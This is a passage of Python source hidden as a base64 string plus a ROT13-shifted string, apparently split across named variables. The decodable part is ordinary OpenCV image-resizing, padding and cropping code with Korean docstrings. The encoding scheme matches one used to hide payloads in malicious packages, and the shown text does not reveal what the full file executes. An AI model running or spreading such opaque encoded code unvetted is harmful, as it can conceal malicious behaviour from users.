YsIG5hbWUpOgogICAgICAgIHNlbGYuX19maWxlbmFtZSA9IG5hbWUKICAgICAgICByZXR1cm4gc2VsZgoKICAgIGRlZiBfX2dldF9jb2xvcnNwYWNlKHNlbGYsIGZyYW1lKToKICAgICAgICBzaGFwZSA9IGZyYW1lLnNoYXBlCiAgICAgICAgaWYgbGVuKHNoYXBlKSA9PSAyOgogICAgICAgICAgICByZXR1cm4gQ29sb3JTcGFjZS5HUkFZCiAgICAgICAgZWxzZToKICAgICAgICAgICAgXywgXywgY2ggPSBzaGFwZQogICAgICAgICAgICBpZiBjaCA9PSAxOgogICAgICAgICAgICAgICAgcmV0dXJuIENvbG9yU3BhY2UuR1JBWQogICAgICAgICAgICBlbGlmIGNoID09IDI6CiAgICAgICAgICAgICAgICByZXR1cm4gQ29sb3JTcGFjZS5HUkFZCiAgICAgICAgICAgIGVsaWYgY2ggPT0gMzoKICAgICAgICAgICAgICAgIHJldHVybiBDb2xvclNwYWNlLkJHUgogICAgICAgICAgICBlbGlmIGNoID09IDQ6CiAgICAgICAgICAgICAgICByZXR1cm4gQ29sb3JTcGFjZS5CR1JBCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByZXR1cm4gQ29sb3JTcGFjZS5HUkFZCgogICAgIyBkZWYgX19yZXNpemVfd2l0aF9ib3JkZXIoc2VsZiwgc2l6ZSk6CiAgICAjICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgIyAgICAgb2xkX3NpemUgPSBmcmFtZS5zaGFwZVs6Ml0gICMgb2xkX3NpemUgaXMgaW4gKGhlaWdodCwgd2lkdGgpIGZvcm1hdAoKICAgICMgICAgIHJhdGlvID0gZmxvYXQoc2l6ZSkgLyBtYXgob2xkX3NpemUpCiAgICAjICAgICBuZXdfc2l6ZSA9IHR1cGxlKFtpbnQoeCAqIHJhdGlvKSBmb3IgeCBpbiBvbGRfc2l6ZV0pCgogICAgIyAgICAgIyBuZXdfc2l6ZSBzaG91bGQgYmUgaW4gKHdpZHRoLCBoZWlnaHQpIGZvcm1hdAogICAgIyAgICAgZnJhbWUgPSBjdjIucmVzaXplKGZyYW1lLCAobmV3X3NpemVbMV0sIG5ld19zaXplWzBdKSkKICAgICMgICAgIGRlbHRhX3cgPSBzaXplIC0gbmV3X3NpemVbMV0KICAgICMgICAgIGRlbHRhX2ggPSBzaXplIC0gbmV3X3NpemVbMF0KCiAgICAjICAgICB0b3AsIGJvdHRvbSA9IDAgKyBkZWx0YV9oIC8vIDIsIGRlbHRhX2ggLSAoZGVsdGFfaCAvLyAyKQogICAgIyAgICAgbGVmdCwgcmlnaHQgPSAwICsgZGVsdGFfdyAvLyAyLCBkZWx0YV93IC0gKGRlbHRhX3cgLy8gMikKCiAgICAjICAgICAjICAg67aA7KGx7ZWcIOu2gOu2hCDqsoDsnYDsg4nsnLzroZwg7LGE7JuM7IScIOuzteyCrO2VnOuLpC4gaHR0cHM6Ly9jYW4tZG8udGlzdG9yeS5jb20vNAogICAgIyAgICAgZnJhbWUgPSBjdjIuY29weU1ha2VCb3JkZXIoZnJhbWUsIHRvcCwgYm90dG9tLCBsZWZ0LCByaWdodCwgY3YyLkJPUkRFUl9DT05TVEFOVCwgdmFsdWU9WzAsIDAsIDBdKQogICAgIyAgICAgcmV0dXJuIEltYWdlKGZyYW1lKSwgcmF0aW8sIHRvcCwgbGVmdAoKICAgIGRlZiByZXNpemUoc2VsZiwgd2lkdGg9MCwgaGVpZ2h0PTApOgogICAgICAgICIiIuuEk+ydtOyZgCDrhpLsnbTrpbwg7KeA7KCV7ZW07IScIOyCrOydtOymiOulvCDrsJTqvrzri6QuCiAgICAgICAg7YGs6riw66W8IOyngOygle2VmOyngCDslYrsnLzrqbQsIO2YhOyerCDsnbTrr7jsp4DsnZgg7IKs7J207KaI66W8IOyCrOyaqe2VnOuLpC4KCiAgICAgICAgQXJnczoKICAgICAgICAgICAgd2lkdGggKGludCwgb3B0aW9uYWwpOiDrhJPsnbQuIERlZmF1bHRzIHRvIDAuCiAgICAgICAgICAgIGhlaWdodCAoaW50LCBvcHRpb25hbCk6IOuGkuydtC4gRGVmYXVsdHMgdG8gMC4KCiAgICAgICAgUmV0dXJuczoKICAgICAgICAgICAgW3R5cGVdOiBbZGVzY3JpcHRpb25dCiAgICAgICAgIiIiCiAgICAgICAgaWYgc2VsZi5fX2ZyYW1lIGlzIE5vbmU6CiAgICAgICAgICAgIHJldHVybiBJbWFnZShucC5jb3B5KHNlbGYuX19mcmFtZSksIHNlbGYuX19jb2xvclNwYWNlKQoKICAgICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgIGlmIHdpZHRoID4gMCBhbmQgaGVpZ2h0ID09IDA6CiAgICAgICAgICAgICMg6rCA66Gc7J2YIO2BrOq4sOyXkCDrp57strDshJwsIOu5hOycqOydhCDsnKDsp4DtlZjrqbTshJwg66as7IKs7J207KaICiAgICAgICAgICAgIHJlc2l6ZWQgPSBpbXV0aWxzLnJlc2l6ZShmcmFtZSwgd2lkdGg9d2lkdGgpCiAgICAgICAgICAgIHJldHVybiBJbWFnZShyZXNpemVkLCBzZWxmLl9fY29sb3JTcGFjZSkKICAgICAgICBlbGlmIHdpZHRoIDw9IDAgb3IgaGVpZ2h0IDw9IDA6CiAgICAgICAgICAgICMg7YGs6riw66W8IOyngOygle2VmOyngCDslYrsnLzrqbQsIO2YhOyerCDsnbTrr7jsp4DsnZgg7YGs6riw66W8IOq3uOuMgOuhnCDsgqzsmqntlZzri6QuCiAgICAgICAgICAgIHdpZHRoID0gc2VsZi53aWR0aCBpZiB3aWR0aCA9PSAwIGVsc2Ugd2lkdGgKICAgICAgICAgICAgaGVpZ2h0ID0gc2VsZi5oZWlnaHQgaWYgaGVpZ2h0ID09IDAgZWxzZSBoZWlnaHQKICAgICAgICAgICAgZnJhbWUgPSBjdjIucmVzaXplKAogICAgICAgICAgICAgICAgZnJhbWUsIGRzaXplPSh3aWR0aCwgaGVpZ2h0KSwgaW50ZXJwb2xhdGlvbj1jdjIuSU5URVJfTElORUFSCiAgICAgICAgICAgICkKICAgICAgICAgICAgcmV0dXJuIEltYWdlKGZyYW1lLCBzZWxmLl9fY29sb3JTcGFjZSkKICAgICAgICBlbGlmIHdpZHRoID4gTUFYX0RJTUVOU0lPTiBvciBoZWlnaHQgPiBNQVhfRElNRU5TSU9OOgogICAgICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUsIHNlbGYuX19jb2xvclNwYWNlKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGZyYW1lID0gY3YyLnJlc2l6ZSgKICAgICAgICAgICAgICAgIHNlbGYuX19mcmFtZSwgZHNpemU9KHdpZHRoLCBoZWlnaHQpLCBpbnRlcnBvbGF0aW9uPWN2Mi5JTlRFUl9MSU5FQVIKICAgICAgICAgICAgKQogICAgICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUsIHNlbGYuX19jb2xvclNwYWNlKQoKICAgIGRlZiBzY2FsZShzZWxmLCBzY2FsZT0xKToKICAgICAgICAiIiLrhJPsnbQsIOuGkuydtOydmCDruYTsnKjsnYQg6rOg7KCV7ZWY6rOgLCDtgazquLDrpbwg7KGw7KCI7ZWc64ukLgoKICAgICAgICBBcmdzOgogICAgICAgICAgICBzY2FsZSAoaW50LCBvcHRpb25hbCk6IO2BrOq4sCDruYTsnKguIERlZmF1bHRzIHRvIDEuCgogICAgICAgIFJldHVybnM6CiAgICAgICAgICAgIEltYWdlOiDtgazquLAg7KGw7KCI65CcIOydtOuvuOyngAogICAgICAgICIiIgogICAgICAgIGlmIHNlbGYuX19mcmFtZSBpcyBOb25lOgogICAgICAgICAgICByZXR1cm4gSW1hZ2UobnAuY29weShzZWxmLl9fZnJhbWUpLCBzZWxmLl9fY29sb3JTcGFjZSkKICAgICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgIGgsIHcgPSBmcmFtZS5zaGFwZVswXSwgZnJhbWUuc2hhcGVbMV0KCiAgICAgICAgIyBmcmFtZSA9IGN2Mi5yZXNpemUoc2VsZi5fX2ZyYW1lLCBkc2l6ZT0odypzY2FsZSwgaCpzY2FsZSksIGludGVycG9sYXRpb249Y3YyLklOVEVSX0xJTkVBUikKICAgICAgICBmcmFtZSA9IGN2Mi5yZXNpemUoCiAgICAgICAgICAgIHNlbGYuX19mcmFtZSwKICAgICAgICAgICAgZHNpemU9KDAsIDApLAogICAgICAgICAgICBmeD1zY2FsZSwKICAgICAgICAgICAgZnk9c2NhbGUsCiAgICAgICAgICAgIGludGVycG9sYXRpb249Y3YyLklOVEVSX0xJTkVBUiwKICAgICAgICApCiAgICAgICAgcmV0dXJuIEltYWdlKGZyYW1lLCBzZWxmLl9fY29sb3JTcGFjZSkKCiAgICBkZWYgYWRhcHRpdmVfc2NhbGUoc2VsZiwgc2l6ZT1Ob25lLCBjb2xvcj0oMCwgMCwgMCkpOgogICAgICAgICIiIuumrOyCrOydtOymiO2VtOyEnCDsoJXsgqzqsIHtmJUg7J2066+47KeA66GcIOunjOuToOuLpC4g67aA7KGx7ZWcIOu2gOu2hOydgCDqsoDsnYDsg4nsnLzroZwg7LGE7Jq064ukLgoKICAgICAgICBBcmdzOgogICAgICAgICAgICBzaXplIChpbnQpOiDsnbTrr7jsp4DsnZgg7ZWcIOuzgCDquLjsnbQKICAgICAgICAgICAgY29sb3IgKHR1cGxlKTog7Jes67Cx67aA67aE7J2YIOyDieyDgSAociwgZywgYikKCiAgICAgICAgUmV0dXJuczoKICAgICAgICAgICAgSW1hZ2U6IOumrOyCrOydtOymiOuQnCDsnbTrr7jsp4AKICAgICAgICAiIiIKICAgICAgICBmcmFtZSA9IG5wLmNvcHkoc2VsZi5fX2ZyYW1lKQogICAgICAgIG9sZF9zaXplID0gZnJhbWUuc2hhcGVbOjJdICAjIG9sZF9zaXplIGlzIGluIChoZWlnaHQsIHdpZHRoKSBmb3JtYXQKICAgICAgICBpZiBub3Qgc2l6ZToKICAgICAgICAgICAgc2l6ZSA9IG1heChvbGRfc2l6ZSkKCiAgICAgICAgcmF0aW8gPSBmbG9hdChzaXplKSAvIG1heChvbGRfc2l6ZSkKICAgICAgICBuZXdfc2l6ZSA9IHR1cGxlKFtpbnQoeCAqIHJhdGlvKSBmb3IgeCBpbiBvbGRfc2l6ZV0pCgogICAgICAgICMgbmV3X3NpemUgc2hvdWxkIGJlIGluICh3aWR0aCwgaGVpZ2h0KSBmb3JtYXQKICAgICAgICBmcmFtZSA9IGN2Mi5yZXNpemUoZnJhbWUsIChuZXdfc2l6ZVsxXSwgbmV3X3NpemVbMF0pKQogICAgICAgIGRlbHRhX3cgPSBzaXplIC0gbmV3X3NpemVbMV0KICAgICAgICBkZWx0YV9oID0gc2l6ZSAtIG5ld19zaXplWzBdCgogICAgICAgIHRvcCwgYm90dG9tID0gMCArIGRlbHRhX2ggLy8gMiwgZGVsdGFfaCAtIChkZWx0YV9oIC8vIDIpCiAgICAgICAgbGVmdCwgcmlnaHQgPSAwICsgZGVsdGFfdyAvLyAyLCBkZWx0YV93IC0gKGRlbHRhX3cgLy8gMikKCiAgICAgICAgY29sb3IgPSBjb2xvcls6Oi0xXQogICAgICAgICMgICDrtoDsobHtlZwg67aA67aEIOqygOydgOyDieycvOuhnCDssYTsm4zshJwg67O17IKs7ZWc64ukLiBodHRwczovL2Nhbi1kby50aXN0b3J5LmNvbS80CiAgICAgICAgZnJhbWUgPSBjdjIuY29weU1ha2VCb3JkZXIoCiAgICAgICAgICAgIGZyYW1lLCB0b3AsIGJvdHRvbSwgbGVmdCwgcmlnaHQsIGN2Mi5CT1JERVJfQ09OU1RBTlQsIHZhbHVlPWNvbG9yCiAgICAgICAgKQogICAgICAgICMgZnJhbWUgPSBjdjIuY29weU1ha2VCb3JkZXIoZnJhbWUsIHRvcCwgYm90dG9tLCBsZWZ0LCByaWdodCwgY3YyLkJPUkRFUl9DT05TVEFOVCwgdmFsdWU9WzAsIDAsIDBdKQogICAgICAgIHJldHVybiBJbWFnZShmcmFtZSksIHJhdGlvLCB0b3AsIGxlZnQKCiAgICAjIGRlZiBzcXVhcml6ZShzZWxmLCBjcm9wPUZhbHNlLCBjb2xvcj0oMCwgMCwgMCkpOgogICAgIyAgICAgIiIi64ST7J207JmAIOuGkuydtOydmCDquLjsnbTqsIAg6rCZ64+E66GdIOygleyCrOqwge2YleycvOuhnCDrp4zrk6Dri6QuCgogICAgIyAgICAgQXJnczoKICAgICMgICAgICAgICBjcm9wIChib29sLCBvcHRpb25hbCk6IOygleyCrOqwge2YleycvOuhnCDsnpDrpbzqsoPsnbjsp4AgKFRydWUpLCDsnbTrr7jsp4Ag7KCE7LK066W8IOygleyCrOqwge2YleycvOuhnCDrgqjquLDroZwg64KY66i47KeAIOu2gOu2hOydgCDso7zslrTsp4Qg7IOJ7IOB7Jy866GcIOyxhOyatOuLpChGYWxzZSkuCiAgICAjICAgICAgICAgY29sb3IgKHR1cGxlLCBvcHRpb25hbCk6IOuCmOuouOyngCDsmIHsl63snYQg7LGE7Jqw64qUIOyDieyDgSAociwgZywgYikKICAgICMgICAgICIiIgogICAgIyAgICAgZnJhbWUgPSBucC5jb3B5KHNlbGYuX19mcmFtZSkKICAgICMgICAgIG9sZF9zaXplID0gZnJhbWUuc2hhcGVbOjJdICAjIG9sZF9zaXplIGlzIGluIChoZWlnaHQsIHdpZHRoKSBmb3JtYXQKCiAgICAjICAgICBpZiBjcm9wOgogICAgIyAgICAgICAgICMgY2VudGVyIGNyb3AKICAgICMgICAgICAgICBpbWdfc2l6ZSA9IG1pbihzZWxmLl9fZnJhbWUuc2hhcGVbOjJdKQogICAgIyAgICAgICAgIGltZyA9IHNlbGYuX19jZW50ZXJfY3JvcCgoaW1nX3NpemUsIGltZ19zaXplKSkKCiAgICAjICAgICAgICAgZGVsdGFfdyA9IG9sZF9zaXplWzFdIC0gaW1nX3NpemUKICAgICMgICAgICAgICBkZWx0YV9oID0gb2xkX3NpemVbMF0gLSBpbWdfc2l6ZQogICAgIyAgICAgICAgIHRvcCwgYm90dG9tID0gZGVsdGFfaCAvLyAyLCBkZWx0YV9oIC0gKGRlbHRhX2ggLy8gMikKICAgICMgICAgICAgICBsZWZ0LCByaWdodCA9IGRlbHRhX3cgLy8gMiwgZGVsdGFfdyAtIChkZWx0YV93IC8vIDIpCiAgICAjICAgICAgICAgcmV0dXJuIGltZywgdG9wLCBsZWZ0CiAgICAjICAgICBlbHNlOgogICAgIyAgICAgICAgICMg7YWM65GQ66as66W8IOunjOuTpOyWtOyEnCDsoJXsgqzqsIHtmJXtmZQKICAgICMgICAgICAgICBzaXplID0gbWF4KHNlbGYuX19mcmFtZS5zaGFwZVs6Ml0pCiAgICAjICAgICAgICAgaW1nLCByYXRpbywgdG9wLCBsZWZ0ID0gc2VsZi5hZGFwdGl2ZV9zY2FsZShzaXplLCBjb2xvcikKICAgICMgICAgICAgICByZXR1cm4gaW1nLCB0b3AsIGxlZnQKCiAgICBkZWYgc3F1YXJpemUoc2VsZiwgc2l6ZSwgY3JvcD1GYWxzZSwgY29sb3I9KDAsIDAsIDApKToKICAgICAgICAiIiLrhJPsnbTsmYAg64aS7J207J2YIOq4uOydtOqwgCDqsJnrj4TroZ0g7KCV7IKs6rCB7ZiV7Jy866GcIOunjOuToOuLpC4KCiAgICAgICAgQXJnczoKICAgICAgICAgICAgY3JvcCAoYm9vbCwgb3B0aW9uYWwpOiDsoJXsgqzqsIHtmJXsnLzroZwg7J6Q66W86rKD7J247KeAIChUcnVlKSwg7J2066+47KeAIOyghOyytOulvCDsoJXsgqzqsIHtmJXsnLzroZwg64Ko6riw66GcIOuCmOuouOyngCDrtoDrtoTsnYAg7KO87Ja07KeEIOyDieyDgeycvOuhnCDssYTsmrTri6QoRmFsc2UpLgogICAgICAgICAgICBjb2xvciAodHVwbGUsIG9wdGlvbmFsKTog64KY66i47KeAIOyYgeyXreydhCDssYTsmrDripQg7IOJ7IOBIChyLCBnLCBiKQogICAgICAgICIiIgogICAgICAgIGlmIGNyb3A6CiAgICAgICAgICAgICMgY2VudGVyIGNyb3AKICAgICAgICAgICAgZnJhbWUgPSBucC5jb3B5KHNlbGYuX19mcmFtZSkKICAgICAgICAgICAgb2xkX3NpemUgPSBmcmFtZS5zaGFwZVs6Ml0gICMgb2xkX3NpemUgaXMgaW4gKGhlaWdodCwgd2lkdGgpIGZvcm1hdAogICAgICAgICAgICAjIDMzNCwgNTAwCiAgICAgICAgICAgIHJhdGlvID0gZmxvYXQoc2l6ZSkgLyBtaW4ob2xkX3NpemUpCiAgICAgICAgICAgIHByaW50KCJAcmF0aW8iLCByYXRpbykKICAgICAgICAgICAgbmV3X3NpemUgPSB0dXBsZShbaW50KHggKiByYXRpbykgZm9yIHggaW4gb2xkX3NpemVdKQogICAgICAgICAgICBwcmludCgiQG5ld19zaXplIiwgbmV3X3NpemUpCgogICAgICAgICAgICAjIOyCrOydtOymiOulvCDspITsnbTqs6AKICAgICAgICAgICAgZnJhbWUgPSBjdjIucmVzaXplKGZyYW1lLCAobmV3X3NpemVbMV0sIG5ld19zaXplWzBdKSkKCiAgICAgICAgICAgICMgQ3JvcO2VmOqzoAogICAgICAgICAgICBpbWdfc2l6ZSA9IG1pbihuZXdfc2l6ZSkKICAgICAgICAgICAgcHJpbnQoIkBpbWdfc2l6ZSIsIGltZ19zaXplKQoKICAgICAgICAgICAgaW1nID0gc2VsZi5fX2NlbnRlcl9jcm9wKGZyYW1lLCAoaW1nX3NpemUsIGltZ19zaXplKSkKICAgICAgICAgICAgcHJpbnQoIkBjcm9wIGltZyBzaGFwZSIsIGltZy5zaGFwZSkKCiAgICAgICAgICAgICMgaW1nID0gSW1hZ2UoZnJhbWUpCiAgICAgICAgICAgIGRlbHRhX3cgPSBuZXdfc2l6ZVsxXSAtIGltZ19zaXplCiAgICAgICAgICAgIGRlbHRhX2ggPSBuZXdfc2l6ZVswXSAtIGltZ19zaXplCiAgICAgICAgICAgIHByaW50KCJAZGVsdGFfdyIsIGRlbHRhX3cpCiAgICAgICAgICAgIHByaW50KCJAZGVsdGFfaCIsIGRlbHRhX2gpCgogICAgICAgICAgICB0b3AsIGJvdHRvbSA9IGRlbHRhX2ggLy8gMiwgZGVsdGFfaCAtIChkZWx0YV9oIC8vIDIpCiAgICAgICAgICAgIGxlZnQsIHJpZ2h0ID0gZGVsdGFfdyAvLyAyLCBkZWx0YV93IC0gKGRlbHRhX3cgLy8gMikKICAgICAgICAgICAgIyDtgazroa3snZgg6rK97Jqw64qUIOuenOuTnOuniO2BrOulvCDrubzspIDri6QuCiAgICAgICAgICAgICMgbGFuZG1hcmtzID0gKChsYW5kbWFya3MgKiByYXRpbykgIC0gbnAuYXJyYXkoW2xlZnQsIHRvcF0pKS5hc3R5cGUobnAuaW50KQogICAgICAgICAgICByZXR1cm4gaW1nLCByYXRpbywgdG9wLCBsZWZ0CiAgICAgICAgZWxzZToKICAgICAgICAgICAgIyDthYzrkZDrpqzrpbwg66eM65Ok7Ja07IScIOygleyCrOqwge2Yle2ZlAogICAgICAgICAgICAjIHNpemUgPSBtYXgoc2VsZi5fX2ZyYW1lLnNoYXBlWzoyXSkKICAgICAgICAgICAgaW1nLCByYXRpbywgdG9wLCBsZWZ0ID0gc2VsZi5hZGFwdGl2ZV9zY2FsZShzaXplLCBjb2xvcikKICAgICAgICAgICAgIyDtgazroa3snZgg6rK97Jqw64qUIOuenOuTnOuniO2BrOulvCDrjZTtlZzri6QuCiAgICAgICAgICAgICMgbGFuZG1hcmtzID0gKChsYW5kbWFya3MgKiByYXRpbykgKyBucC5hcnJheShbbGVmdCwgdG9wXSkpLmFzdHlwZShucC5pbnQpCiAgICAgICAgICAgIHJldHVybiBpbWcsIHJhdGlvLCB0b3AsIGxlZnQKCiAgICBkZWYgX19fcmVzaXplKHNlbGYsIHdpZHRoPTAsIGhlaWdodD0wLCBmeD0wLCBmeT0wKToKICAgICAgICBpZiBzZWxmLl9fZnJhbWUgaXMgTm9uZToKICAgICAgICAgICAgcmV0dXJuIEltYWdlKG5wLmNvcHkoc2VsZi5fX2ZyYW1lKSwgc2VsZi5fX2NvbG9yU3BhY2UpCgogICAgICAgIGZyYW1lID0gbnAuY29weShzZWxmLl9fZnJhbWUpCiAgICAgICAgaWYgd2lkdGggPD0gMCBvciBoZWlnaHQgPD0gMDoKICAgICAgICAgICAgaWYgZnggPT0gMCBvciBmeSA9PSAwOgogICAgICAgICAgICAgICAgcmV0dXJuIEltYWdlKG5wLmNvcHkoc2VsZi5fX2ZyYW1lKSwgc2VsZi5fX2NvbG9yU3BhY2UpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBmcmFtZSA9IGN2Mi5yZXNpemUoCiAgICAgICAgICAgICAgICAgICAgZnJhbWUsIGRzaXplPSgwLCAwKSwgZng9ZngsIGZ5PWZ5LCBpbnRlcnBvbGF0aW9uPWN2Mi5JTlRFUl9MSU5FQVIKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIHJldHVybiBJbWFnZShmcmFtZSwgc2VsZi5fX2NvbG9yU3BhY2UpCgogICAgICAgIGVsaWYgd2lkdGggPiBNQVhfRElNRU5TSU9OIG9yIGhlaWdodCA+IE1BWF9ESU1FTlNJT046CiAgICAgICAgICAgIHJldHVybiBJbWFnZShucC5jb3B5KHNlbGYuX19mcmFtZSksIHNlbGYuX19jb2xvclNwYWNlKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGZyYW1lID0gY3YyLnJlc2l6ZSgKICAgICAgICAgICAgICAgIHNlbGYuX19mcmFtZSwgZHNpemU9KHdpZHRoLCBoZWlnaHQpLCBpbnRlcnBvbGF0aW9uPWN2Mi5JTlRFUl9MSU5FQVIKICAgICAgICAgICAgKQogICAgICAgICAgICByZXR1cm4gSW1hZ2UoZnJhbWUsIHNlbGYuX19jb2xvclNwYWNlKQoKICAgIGRlZiBjcm9wKHNlbGYsIHg9MCwgeT0wLCB3aWR0aD0wLCBoZWlnaHQ9MCwgY2VudGVyZWQ9RmFsc2UpOgogICAgICAgICIiIuyngOygle2VnCDsooztkZzrpbwg7Iuc7J6R7KCQ7Jy866GcIO2VtOyEnCDso7zslrTsp4Qg7YGs6riw66GcIOydtOuvuOyngO'
-love = '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